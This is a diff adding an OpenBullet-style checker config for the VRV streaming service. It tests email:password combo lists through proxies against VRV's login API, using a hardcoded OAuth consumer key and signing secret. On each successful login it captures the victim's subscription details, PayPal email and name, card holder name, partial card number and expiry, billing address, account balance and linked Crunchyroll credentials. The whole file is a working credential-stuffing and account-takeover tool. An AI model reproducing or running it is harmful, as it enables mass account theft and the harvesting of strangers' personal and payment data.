@@ -1,0 +1,357 @@
+[SETTINGS]
+{
+  "Name": "vrv",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-08T16:20:32.072723+00:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "vrv",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#enc_USER FUNCTION URLEncode "<USER>" -> VAR "enc_USER" 
+
+#enc_PASS FUNCTION URLEncode "<PASS>" -> VAR "enc_PASS" 
+
+## HAMC
+
+#nonce FUNCTION RandomString "?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i" -> VAR "nonce" 
+
+#time FUNCTION CurrentUnixTime -> VAR "time" 
+
+#payload FUNCTION URLEncode "email=<enc_USER>&oauth_consumer_key=OvqR158Z9212i41UkNRzooutpU9Vp0vuXD9K0zKAvJdXPh6LfMOro4stVQRS&oauth_nonce=<nonce>&oauth_signature_method=HMAC-SHA1&oauth_timestamp=<time>&oauth_version=1.0&password=<enc_PASS>" -> VAR "payload" 
+
+#signature FUNCTION HMAC SHA1 "EBgJav6Z99M9jFLzcexL6iETovNGbobFAJGudkDKMloqaBJgdo9u3WNuumM1&" HmacBase64=TRUE "POST&https%3A%2F%2Fapi.vrv.co%2Fcore%2Fauthenticate%2Fby%3Acredentials&<payload>" -> VAR "signature" 
+
+#signature FUNCTION URLEncode "<signature>" -> VAR "signature" 
+
+## LOGIN
+
+REQUEST POST "https://api.vrv.co/core/authenticate/by:credentials" 
+  CONTENT "email=<enc_USER>&password=<enc_PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: api.vrv.co" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Microsoft Edge\";v=\"97\", \"Chromium\";v=\"97\"" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Authorization: OAuth oauth_consumer_key=\"OvqR158Z9212i41UkNRzooutpU9Vp0vuXD9K0zKAvJdXPh6LfMOro4stVQRS\", oauth_nonce=\"<nonce>\", oauth_signature=\"<signature>\", oauth_signature_method=\"HMAC-SHA1\", oauth_timestamp=\"<time>\", oauth_version=\"1.0\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.55" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://vrv.co" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://vrv.co/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Authentication failed." 
+  KEYCHAIN Success OR 
+    KEY "account_id" 
+
+## CAPTURE HMAC
+
+#time FUNCTION CurrentUnixTime -> VAR "time" 
+
+#token PARSE "<SOURCE>" JSON "oauth_token" JTokenParsing=TRUE -> VAR "token" 
+
+#secret PARSE "<SOURCE>" JSON "oauth_token_secret" JTokenParsing=TRUE -> VAR "secret" 
+
+#ID PARSE "<SOURCE>" LR "account_id\":\"" "\"," -> VAR "ID" 
+
+## Linked Subscriptions
+
+#nonce FUNCTION RandomString "?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i" -> VAR "nonce" 
+
+#signature FUNCTION HMAC SHA1 "EBgJav6Z99M9jFLzcexL6iETovNGbobFAJGudkDKMloqaBJgdo9u3WNuumM1&<secret>" HmacBase64=TRUE "GET&https%3A%2F%2Fapi.vrv.co%2Fcore%2Faccounts%2F<ID>%2Fsubscription&oauth_consumer_key%3DOvqR158Z9212i41UkNRzooutpU9Vp0vuXD9K0zKAvJdXPh6LfMOro4stVQRS%26oauth_nonce%3D<nonce>%26oauth_signature_method%3DHMAC-SHA1%26oauth_timestamp%3D<time>%26oauth_token%3D<token>%26oauth_version%3D1.0" -> VAR "signature" 
+
+#signature FUNCTION URLEncode "<signature>" -> VAR "signature" 
+
+#subscription REQUEST GET "https://api.vrv.co/core/accounts/<ID>/subscription" 
+  
+  HEADER "Host: api.vrv.co" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Microsoft Edge\";v=\"97\", \"Chromium\";v=\"97\"" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Authorization: OAuth oauth_consumer_key=\"OvqR158Z9212i41UkNRzooutpU9Vp0vuXD9K0zKAvJdXPh6LfMOro4stVQRS\", oauth_nonce=\"<nonce>\", oauth_signature=\"<signature>\", oauth_signature_method=\"HMAC-SHA1\", oauth_timestamp=\"<time>\", oauth_token=\"<token>\", oauth_version=\"1.0\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.55" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://vrv.co" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://vrv.co/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+IF "<SOURCE>" Contains "Account has no active Subscription"
+
+#VRV_Subscription FUNCTION Constant "This account does not have any subscription Billed with VRV." -> CAP "VRV Subscription" 
+
+ENDIF
+IF "<SOURCE>" Contains "\"__class__\":\"subscription\""
+
+#next_renewal_date PARSE "<SOURCE>" REGEX "\"next_renewal_date\":\"(.*?)-(.*?)-(.*?)T(.*?):(.*?):(.*?)\\+00:00\"" "[2]-[3]-[1] [4]:[5]:[6]" Recursive=TRUE -> VAR "next_renewal_date" 
+
+#currency_code PARSE "<SOURCE>" JSON "currency_code" JTokenParsing=TRUE Recursive=TRUE -> VAR "currency_code" 
+
+#is_free_trial PARSE "<SOURCE>" JSON "is_free_trial" JTokenParsing=TRUE Recursive=TRUE -> VAR "is_free_trial" 
+
+#recurring_amount PARSE "<SOURCE>" JSON "recurring_amount" JTokenParsing=TRUE Recursive=TRUE -> VAR "recurring_amount" 
+
+#recurring_interval_length PARSE "<SOURCE>" JSON "recurring_interval_length" JTokenParsing=TRUE Recursive=TRUE -> VAR "recurring_interval_length" 
+
+#recurring_interval_length FUNCTION Translate 
+  KEY "P1M" VALUE "Billed Monthly" 
+  "<recurring_interval_length[*]>" -> VAR "recurring_interval_length" 
+
+#RemainingDays FUNCTION GetRemainingDay "<next_renewal_date[*]>" -> VAR "RemainingDays" 
+
+#RemainingDays FUNCTION Compute "<RemainingDays[*]>+1" -> VAR "RemainingDays" 
+
+#VRV_Subscription FUNCTION Constant "Subscription name = VRV Premium {No Ads, Newest Episodes, Exclusives}, Price = <recurring_amount[*]> <currency_code[*]>, IS Free Trial = <is_free_trial[*]>, Expiry = <next_renewal_date[*]>, Remaining Days = <RemainingDays[*]>, Billing Period = <recurring_interval_length[*]>" -> CAP "VRV Subscription" 
+
+#nonce FUNCTION RandomString "?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i" -> VAR "nonce" 
+
+#signature FUNCTION HMAC SHA1 "EBgJav6Z99M9jFLzcexL6iETovNGbobFAJGudkDKMloqaBJgdo9u3WNuumM1&<secret>" HmacBase64=TRUE "GET&https%3A%2F%2Fapi.vrv.co%2Fcore%2Faccounts%2F<ID>%2Fpayment_methods&oauth_consumer_key%3DOvqR158Z9212i41UkNRzooutpU9Vp0vuXD9K0zKAvJdXPh6LfMOro4stVQRS%26oauth_nonce%3D<nonce>%26oauth_signature_method%3DHMAC-SHA1%26oauth_timestamp%3D<time>%26oauth_token%3D<token>%26oauth_version%3D1.0" -> VAR "signature" 
+
+#signature FUNCTION URLEncode "<signature>" -> VAR "signature" 
+
+ENDIF
+
+#payment_methods REQUEST GET "https://api.vrv.co/core/accounts/<ID>/payment_methods" 
+  
+  HEADER "Host: api.vrv.co" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"97\", \"Chromium\";v=\"97\"" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Authorization: OAuth oauth_consumer_key=\"OvqR158Z9212i41UkNRzooutpU9Vp0vuXD9K0zKAvJdXPh6LfMOro4stVQRS\", oauth_nonce=\"<nonce>\", oauth_signature=\"<signature>\", oauth_signature_method=\"HMAC-SHA1\", oauth_timestamp=\"<time>\", oauth_token=\"<token>\", oauth_version=\"1.0\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://vrv.co" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://vrv.co/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+IF "<SOURCE>" Contains "\"__class__\":\"paypal_billing_agreement\"" 
+
+#payer_email PARSE "<SOURCE>" JSON "items[*].payer_email" JTokenParsing=TRUE -> VAR "payer_email" 
+
+#payer_name PARSE "<SOURCE>" JSON "items[*].payer_name" JTokenParsing=TRUE -> VAR "payer_name" 
+
+#payer_zip PARSE "<SOURCE>" JSON "items[*].payer_zip" JTokenParsing=TRUE -> VAR "payer_zip" 
+
+#payer_country PARSE "<SOURCE>" JSON "items[*].payer_country" JTokenParsing=TRUE -> VAR "payer_country" 
+
+#PayPal_Linked FUNCTION Constant "[PayPal Email = <payer_email> & PayPal Name = <payer_name>, Zipcode = <payer_zip>, Country = <payer_country>]" -> CAP "PayPal Linked" 
+
+ENDIF
+IF "<SOURCE>" Contains "\"__class__\":\"credit_card\"" 
+
+#cardholder_name PARSE "<SOURCE>" JSON "items[*].cardholder_name" JTokenParsing=TRUE Recursive=TRUE -> VAR "cardholder_name" 
+
+#first_6 PARSE "<SOURCE>" REGEX "\"first_6\":\"([0-9]{4})([0-9]{2})\"" "[1] [2]" Recursive=TRUE -> VAR "first_6" 
+
+#last_4 PARSE "<SOURCE>" JSON "items[*].last_4" JTokenParsing=TRUE Recursive=TRUE -> VAR "last_4" 
+
+#exp_month PARSE "<SOURCE>" JSON "items[*].exp_month" JTokenParsing=TRUE Recursive=TRUE -> VAR "exp_month" 
+
+#exp_year PARSE "<SOURCE>" JSON "items[*].exp_year" JTokenParsing=TRUE Recursive=TRUE -> VAR "exp_year" 
+
+#status PARSE "<SOURCE>" JSON "items[*].status" JTokenParsing=TRUE Recursive=TRUE -> VAR "status" 
+
+#card_brand PARSE "<SOURCE>" JSON "items[*].card_brand" JTokenParsing=TRUE Recursive=TRUE -> VAR "card_brand" 
+
+#billing_address_1 PARSE "<SOURCE>" JSON "items[*].billing_address_1" JTokenParsing=TRUE Recursive=TRUE -> VAR "billing_address_1" 
+
+#billing_address_2 PARSE "<SOURCE>" JSON "items[*].billing_address_2" JTokenParsing=TRUE Recursive=TRUE -> VAR "billing_address_2" 
+
+#billing_city PARSE "<SOURCE>" JSON "items[*].billing_city" JTokenParsing=TRUE Recursive=TRUE -> VAR "billing_city" 
+
+#billing_state PARSE "<SOURCE>" JSON "items[*].billing_state" JTokenParsing=TRUE Recursive=TRUE -> VAR "billing_state" 
+
+#billing_zip PARSE "<SOURCE>" JSON "items[*].billing_zip" JTokenParsing=TRUE Recursive=TRUE -> VAR "billing_zip" 
+
+#billing_country PARSE "<SOURCE>" JSON "items[*].billing_country" JTokenParsing=TRUE Recursive=TRUE -> VAR "billing_country" 
+
+#Credit_Cards FUNCTION Constant "Card holder Name = <cardholder_name[*]>, Card Number = <first_6[*]>•• •••• <last_4[*]>, Card Expiry = <exp_month[*]>/<exp_year[*]>, Card Status = <status[*]>, Card Brand = <card_brand[*]> [Billing Address: Steet = <billing_address_1[*]>, Address 2 = <billing_address_2[*]>, City = <billing_city[*]>, State = <billing_state[*]>, ZIpcode = <billing_zip[*]>, Country = <billing_country[*]>]" -> CAP "Credit Cards" 
+
+ENDIF
+
+#nonce FUNCTION RandomString "?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i" -> VAR "nonce" 
+
+#signature FUNCTION HMAC SHA1 "EBgJav6Z99M9jFLzcexL6iETovNGbobFAJGudkDKMloqaBJgdo9u3WNuumM1&<secret>" HmacBase64=TRUE "GET&https%3A%2F%2Fapi.vrv.co%2Fcore%2Faccounts%2F<ID>%2Faccount_balance&oauth_consumer_key%3DOvqR158Z9212i41UkNRzooutpU9Vp0vuXD9K0zKAvJdXPh6LfMOro4stVQRS%26oauth_nonce%3D<nonce>%26oauth_signature_method%3DHMAC-SHA1%26oauth_timestamp%3D<time>%26oauth_token%3D<token>%26oauth_version%3D1.0" -> VAR "signature" 
+
+#signature FUNCTION URLEncode "<signature>" -> VAR "signature" 
+
+REQUEST GET "https://api.vrv.co/core/accounts/<ID>/account_balance" 
+  
+  HEADER "Host: api.vrv.co" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Microsoft Edge\";v=\"97\", \"Chromium\";v=\"97\"" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Authorization: OAuth oauth_consumer_key=\"OvqR158Z9212i41UkNRzooutpU9Vp0vuXD9K0zKAvJdXPh6LfMOro4stVQRS\", oauth_nonce=\"<nonce>\", oauth_signature=\"<signature>\", oauth_signature_method=\"HMAC-SHA1\", oauth_timestamp=\"<time>\", oauth_token=\"<token>\", oauth_version=\"1.0\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.55" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://vrv.co" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://vrv.co/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+IF "<SOURCE>" Contains "\"funds\":{}"
+
+#GIFT_CARD_BALANCE FUNCTION Constant "$0" -> CAP "GIFT CARD BALANCE" 
+
+ENDIF
+
+#nonce FUNCTION RandomString "?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i" -> VAR "nonce" 
+
+#signature FUNCTION HMAC SHA1 "EBgJav6Z99M9jFLzcexL6iETovNGbobFAJGudkDKMloqaBJgdo9u3WNuumM1&<secret>" HmacBase64=TRUE "GET&https%3A%2F%2Fapi.vrv.co%2Fcore%2Faccounts%2F<ID>%2Fsubscription%2Fsubscribed_products&oauth_consumer_key%3DOvqR158Z9212i41UkNRzooutpU9Vp0vuXD9K0zKAvJdXPh6LfMOro4stVQRS%26oauth_nonce%3D<nonce>%26oauth_signature_method%3DHMAC-SHA1%26oauth_timestamp%3D<time>%26oauth_token%3D<token>%26oauth_version%3D1.0" -> VAR "signature" 
+
+#signature FUNCTION URLEncode "<signature>" -> VAR "signature" 
+
+#External_Subscription REQUEST GET "https://api.vrv.co/core/accounts/<ID>/subscription/subscribed_products" 
+  
+  HEADER "Host: api.vrv.co" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0" 
+  HEADER "Authorization: OAuth oauth_consumer_key=\"OvqR158Z9212i41UkNRzooutpU9Vp0vuXD9K0zKAvJdXPh6LfMOro4stVQRS\", oauth_nonce=\"<nonce>\", oauth_signature=\"<signature>\", oauth_signature_method=\"HMAC-SHA1\", oauth_timestamp=\"<time>\", oauth_token=\"<token>\", oauth_version=\"1.0\"" 
+  HEADER "Origin: https://vrv.co" 
+  HEADER "Referer: https://vrv.co/" 
+
+#type PARSE "<SOURCE>" JSON "items[*].type" JTokenParsing=TRUE Recursive=TRUE -> VAR "type" 
+
+#description PARSE "<SOURCE>" JSON "items[*].description" JTokenParsing=TRUE Recursive=TRUE -> VAR "description" 
+
+#source PARSE "<SOURCE>" JSON "items[*].source" JTokenParsing=TRUE Recursive=TRUE -> VAR "source" 
+
+#External_Subscriptions FUNCTION Constant "Type = <type[*]> & External Subscription Description = <description[*]> & Billed Through = <source[*]>" -> CAP "External Subscriptions" 
+
+IF "<SOURCE>" Contains "\"items\":[]" 
+
+#External_Subscriptions FUNCTION Constant "This account does not have any External subscription." -> CAP "External Subscriptions" 
+
+ENDIF
+
+#nonce FUNCTION RandomString "?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i?i" -> VAR "nonce" 
+
+#signature FUNCTION HMAC SHA1 "EBgJav6Z99M9jFLzcexL6iETovNGbobFAJGudkDKMloqaBJgdo9u3WNuumM1&<secret>" HmacBase64=TRUE "GET&https%3A%2F%2Fapi.vrv.co%2Fcore%2Faccounts%2F<ID>%2Flinked_partners&oauth_consumer_key%3DOvqR158Z9212i41UkNRzooutpU9Vp0vuXD9K0zKAvJdXPh6LfMOro4stVQRS%26oauth_nonce%3D<nonce>%26oauth_signature_method%3DHMAC-SHA1%26oauth_timestamp%3D<time>%26oauth_token%3D<token>%26oauth_version%3D1.0" -> VAR "signature" 
+
+#signature FUNCTION URLEncode "<signature>" -> VAR "signature" 
+
+#Crunchyroll_linked REQUEST GET "https://api.vrv.co/core/accounts/<ID>/linked_partners" 
+  
+  HEADER "Host: api.vrv.co" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Microsoft Edge\";v=\"97\", \"Chromium\";v=\"97\"" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Authorization: OAuth oauth_consumer_key=\"OvqR158Z9212i41UkNRzooutpU9Vp0vuXD9K0zKAvJdXPh6LfMOro4stVQRS\", oauth_nonce=\"<nonce>\", oauth_signature=\"<signature>\", oauth_signature_method=\"HMAC-SHA1\", oauth_timestamp=\"<time>\", oauth_token=\"<token>\", oauth_version=\"1.0\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.55" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://vrv.co" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://vrv.co/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#linked_name PARSE "<SOURCE>" JSON "items[*].name" JTokenParsing=TRUE Recursive=TRUE -> VAR "linked_name" 
+
+#has_membership PARSE "<SOURCE>" JSON "items[*].user_account_status.has_membership" JTokenParsing=TRUE Recursive=TRUE -> VAR "has_membership" 
+
+#email PARSE "<SOURCE>" JSON "items[*].user_account_status.email" JTokenParsing=TRUE Recursive=TRUE -> VAR "email" 
+
+#username PARSE "<SOURCE>" JSON "items[*].user_account_status.username" JTokenParsing=TRUE Recursive=TRUE -> VAR "username" 
+
+IF "<SOURCE>" Contains "\"items\":[]"
+
+#Crunchyroll_Linked FUNCTION Constant "Not linked [You can Link Your Email and get FREE Cunchyroll Premium!!!!]" -> CAP "Crunchyroll Linked" 
+
+FUNCTION Constant 
+
+ELSE
+IF VAR "External Subscriptions" Contains "Linked Account"
+
+#Crunchyroll_Linked FUNCTION Constant "Linked Account = <linked_name[*]>, Username = <username[*]>, Crunchyroll Email = <email[*]>" -> CAP "Crunchyroll Linked" 
+
+ENDIF
+IF "<SOURCE>" Contains "\"user_account_status\":{}" 
+
+#Crunchyroll_Linked FUNCTION Constant "Not linked [You can Link Your Email and get FREE Cunchyroll Premium!!!!]" -> CAP "Crunchyroll Linked" 
+
+ENDIF
+
+#Author FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config by" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<VRV Subscription>" Contains "This account does not have any subscription Billed with VRV." 
+    KEY "<GIFT CARD BALANCE>" EqualTo "$0" 
+    KEY "<External Subscriptions>" Contains "This account does not have any External subscription." 
+
